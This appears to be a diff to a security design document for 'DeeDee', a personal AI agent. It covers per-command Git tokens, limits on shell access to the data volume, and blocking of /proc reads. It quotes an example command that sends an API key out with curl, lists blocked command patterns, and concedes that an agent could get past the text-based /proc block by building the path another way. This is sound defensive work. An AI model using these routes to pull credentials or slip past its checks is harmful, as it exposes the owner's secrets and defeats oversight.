@@ -11,7 +11,7 @@ DeeDee operates on a **"YOLO but Safe"** model. This means we prioritize **Perso
 - **Abort**: If a secret is found, the commit is completely blocked.
 - **No `git add .`**: tracked changes are staged with `git add -u -- <paths>`. Untracked files are staged one by one, and only when they live under `apps/`, `packages/`, `docs/` or `specs/` with an allowed extension (`.js .jsx .mjs .cjs .ts .json .md .yml .yaml .py .txt .css .sh .svg .png`) or the bare name `Dockerfile`. Root-level files, `data/`, `*.db` and `.github/` never get staged: a staged workflow file would run in CI with the repository's secrets. Skipped files are logged and returned as `skipped` in the result. When a skipped file sits under one of the allowed folders, `commitAndPush` returns `success: false` and names it, so the agent sees the drop instead of a partial commit. This keeps personal files the agent drops into its work dir out of the public repo.
 - **Safe file names**: `git status --porcelain -z` supplies the names, so the agent chooses them. Only names made of `A-Z a-z 0-9 . _ / @ - + [ ]` pass; anything else is skipped before the verifier and before `git add`. The verifier runs `node --check` through `execFile` (no shell) and refuses unsafe names on its own as well. `git add` runs with `--literal-pathspecs`, because `[id]` in a Next.js route folder is a glob to git.
-- **Token per command**: the GitHub PAT never enters the stored remote URL. `.git/config` sits on the `/app/source` volume, which the agent reads, so a token there is a token the agent can send anywhere, and `redactSecrets` did not match that shape. `GIT_REMOTE_URL` is stored clean (an older URL that carries a token is scrubbed on the next boot), and `fetch`, `pull` and `push` pass `-c http.extraheader=Authorization: Basic …` built from `GITHUB_PAT`. Failure text from those commands is scrubbed before it reaches the logs or the agent, because git repeats its own argv when it fails.
+- **Token per command**: the GitHub PAT never enters the stored remote URL. `.git/config` sits on the `/app/source` volume, which the agent reads, so a token there is a token the agent can send anywhere, and `redactSecrets` did not match that shape. `GIT_REMOTE_URL` is stored clean (an older URL that carries a token is scrubbed on the next boot), and `fetch`, `pull` and `push` pass `-c http.<remote URL>.extraheader=Authorization: Basic …` built from `GITHUB_PAT`. The header names that URL, and the commands address that URL instead of the remote `origin`, because the agent writes `.git/config`: a global header would follow whatever host the file names, and a rewritten `origin` would receive the token. With no `GIT_REMOTE_URL`, a command that carries the token is refused. Failure text from those commands is scrubbed before it reaches the logs or the agent, because git repeats its own argv when it fails.
 - **Identity per command**: `commitAndPush` and `rollback` pass `-c user.name=… -c user.email=…` from `GIT_USER_NAME` / `GIT_USER_EMAIL` on every `git commit` and `git revert`. The agent can rewrite `.git/config` in the shared `/app/source` volume; that no longer changes who authored a commit.
 
 ### 2. Remote Code Execution (RCE) via Prompt Injection
@@ -43,7 +43,7 @@ DeeDee operates on a **"YOLO but Safe"** model. This means we prioritize **Perso
 
 ### Filesystem
 - **Read/Write**: `/app/source` (The repo itself).
-- **Read/Write**: `/app/data` (Persistent DBs).
+- **Read/Write**: `/app/data` (Persistent DBs). The shell reaches `output/`, `journal/`, `vaults/`, `vinyl_covers/` and `wardrobe/` only, and only by a path with no glob and no `..`. The rest of the volume — the browser profile and its secrets file, the WhatsApp session, the Google credentials, the databases — is refused.
 - **Supervisor only**: `/app/state` (`supervisor-state` volume; rollback trust anchors). Not mounted into the agent.
 - **Interfaces only**: `interfaces-data` (WhatsApp session credentials and message database). Not mounted into the agent: a shell command there would have read the credentials that own the owner's WhatsApp account. The agent asks the interfaces service for the day's messages over `GET /internal/whatsapp/messages-by-date` (bearer `DEEDEE_INTERNAL_TOKEN`, which an `DEEDEE_API_TOKEN` holder does not have).
 - **Read-Only**: `/proc`, `/sys`.
@@ -85,7 +85,13 @@ The agent process holds every provider key. Child processes do not.
   and `LANG` only. `SHELL_ENV_PASSTHROUGH` (names separated by commas or
   spaces) adds more. A command like `curl -d "$GOOGLE_API_KEY" https://…`
   therefore sends nothing, which matters because output redaction cannot help
-  when a command returns no output.
+  when a command returns no output. **This is a guard rail, not a boundary.**
+  The child still runs as root and shares the container's `/proc`, where the
+  agent's own `/proc/<pid>/environ` holds the keys the process started with.
+  `BLOCKED_PATTERNS` refuses every spelling of `/proc` and the word `environ`,
+  but the rules read the command text, so a command that builds the path
+  another way gets through. The fix that holds is a separate, unprivileged uid
+  for the shell child; it is open work (Batch 6).
 - **MCP servers**: every stdio server starts with a fixed base list
   (`MCP_BASE_ENV_VARS` in `apps/agent/src/mcp-manager.js`: shell, locale, TLS
   trust store, python and Chromium paths) plus the variables its own block in
@@ -125,7 +131,7 @@ unasked, and jobs stay quiet unless they truly need him.
 - appointment tools named `*book_appointment` / `*cancel_appointment` (Allende) and `*book_turn` / `*cancel_turn` (Pilotfy);
 - `commitAndPush` (code that will run on the device);
 - data-destroying deletes: `deletePerson`, `deleteVault`, `delete_garment`, `deleteDeviceAlias` (per-tool flags), Plex deletes and edits, and `ha_config_remove_*` / `ha_remove_device|entity|zone|area_or_floor|helpers_integrations`. Everyday removals run unasked: `ha_remove_todo_item`, Plex `playlist_remove_from` / `collection_remove_from`, `remove_from_wardrobe_trip_capsule`, `cancelJob`;
-- shell commands that pipe remote content into an interpreter, damage the system, touch the databases, the WhatsApp credentials volume, the browser profile or the CDP port.
+- shell commands that pipe remote content into an interpreter, damage the system, touch the databases, the WhatsApp credentials volume, the browser profile, `/proc`, a closed folder of the data volume or the CDP port. The rule reads the same list the local MCP server refuses (`BLOCKED_PATTERNS` in `packages/mcp-servers/src/local/index.js`), so the two layers cannot drift apart.
 
 A rule that throws on odd arguments counts as a hit. A malformed call is
 held, never let through.
@@ -189,7 +195,8 @@ TTLs, deny-list editor); `GET /v1/approvals`, `POST /v1/approvals/:id/approve|de
 `pending_confirmations` in `agent.db`; logs with the `[Approvals]` prefix.
 
 Still open (Batch 6): an exact allowlist for `runShellCommand` and network
-tools instead of pattern checks.
+tools instead of pattern checks, and a separate unprivileged uid for the shell
+child, so file modes and `/proc` stop a read that a text rule misses.
 
 ## Personal data guard
 
